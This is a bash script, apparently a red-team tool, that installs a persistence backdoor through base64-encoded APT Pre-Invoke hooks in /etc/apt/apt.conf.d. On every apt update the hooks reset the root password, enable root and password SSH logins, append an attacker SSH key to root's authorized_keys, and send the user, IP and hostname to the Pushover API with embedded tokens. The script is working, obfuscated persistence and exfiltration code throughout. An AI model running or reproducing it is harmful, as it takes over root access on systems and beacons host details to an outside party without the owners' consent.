#!/bin/bash

PASS="${1:-redteam123}"
## Usage: # ./aptAPT.sh

U=$(whoami)
H=$(hostname)
IPV4=$(ip -4 addr show | grep -v 127 | grep -Po '(?<=inet\s)\d+(\.\d+){3}' | head -n 1)

MESSAGE="${U}\@${IPV4}\ ${H}"

INTERMEDIATE1="printf '${PASS}\n${PASS}' | passwd root 2>&-"
PAYLOAD1=$(echo -n "${INTERMEDIATE1}"  | base64 -w 0)

INTERMEDIATE2="sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config && sudo service ssh restart"
PAYLOAD2=$(echo -n "${INTERMEDIATE2}"  | base64 -w 0)

INTERMEDIATE3='curl -so /dev/null -F "token=a3kffz2dbhmwvctwjf8xpmcnub4njz" -F "user=u51Zq2vyGtGEikc6DdAwXn3XNS1Zxr" -F "title=APT" -F '"message=${MESSAGE}"' -F "sound=bugle" https://api.pushover.net/1/messages.json; 2>&-'
PAYLOAD3=$(echo -n "${INTERMEDIATE3}"  | base64 -w 0)

INTERMEDIATE4='echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQDV4HmsuDrNI7MZpsOYxaaOYz5o5ZZ2iGXhK//Mp4tdvLojcBCBX8TZd3o9jOTDhpayVInmvTFDRzNzfz3WxRIvL9jP1s04I/jC4NdD4u1hI1DBP9YaCfYDgd1JZHFueNBWYZpltB/dhQi5es8l+Q0IFCsgWNbQ/oLrx3/cyHugeQ==" >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys'
PAYLOAD4=$(echo -n "${INTERMEDIATE4}"  | base64 -w 0)

INTERMEDIATE5="sed -i 's/^PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config"
PAYLOAD5=$(echo -n "${INTERMEDIATE5}"  | base64 -w 0)

DEST_DIR='/etc/apt/apt.conf.d'
DEST_FILE='20bdus'

if ! [[ $(apt 2>&-) ]]; then
	echo "apt missing"
	exit 1
fi

if [[ -d "${DEST_DIR}" ]]; then
	echo "APT::Update::Pre-Invoke {\"printf '${PAYLOAD1}' | base64 -d | sh\"};" > "${DEST_DIR}/${DEST_FILE}"
	echo "APT::Update::Pre-Invoke {\"printf '${PAYLOAD2}' | base64 -d | sh\"};" >> "${DEST_DIR}/${DEST_FILE}"
	echo "APT::Update::Pre-Invoke {\"printf '${PAYLOAD3}' | base64 -d | sh\"};" >> "${DEST_DIR}/${DEST_FILE}"
	echo "APT::Update::Pre-Invoke {\"printf '${PAYLOAD4}' | base64 -d | sh\"};" >> "${DEST_DIR}/${DEST_FILE}"
  echo "APT::Update::Pre-Invoke {\"printf '${PAYLOAD5}' | base64 -d | sh\"};" >> "${DEST_DIR}/${DEST_FILE}"
else
	echo "${DEST_DIR} does not exist"
	exit 1
fi

./logger.sh APT 'APT hooks installed'